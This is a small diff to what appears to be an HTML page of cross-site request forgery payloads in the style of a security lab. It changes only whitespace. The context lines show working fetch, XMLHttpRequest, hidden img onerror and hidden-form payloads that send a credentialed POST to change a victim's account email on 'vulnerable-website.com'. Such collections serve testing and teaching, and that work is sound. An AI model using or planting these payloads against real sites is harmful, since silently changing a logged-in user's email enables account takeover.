@@ -92,6 +92,8 @@ fetch("http://vulnerable-website.com/email/change", {
     body: "email=wiener@normal-user.com"
 });
 </script>
+
+
 </pre><hr><h2>Xhr Payload</h2><pre>
 <script>
 var xhr = new XMLHttpRequest();
@@ -100,6 +102,8 @@ xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhr.send("email=wiener@normal-user.com");
 </script>
+
+
 </pre><hr><h2>Onerror Payload</h2><pre>
 <img src="" onerror="fetch('http://vulnerable-website.com/email/change', {
     method: 'POST',
@@ -107,6 +111,7 @@ xhr.send("email=wiener@normal-user.com");
     credentials: 'include',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'email=wiener@normal-user.com'
 })" style="display:none;">
+
 </pre><hr><h2>Form Payload</h2><pre>
 <form action="http://vulnerable-website.com/email/change" method="POST" target="hidden_iframe">
     <input type="hidden" name="email" value="wiener@normal-user.com">
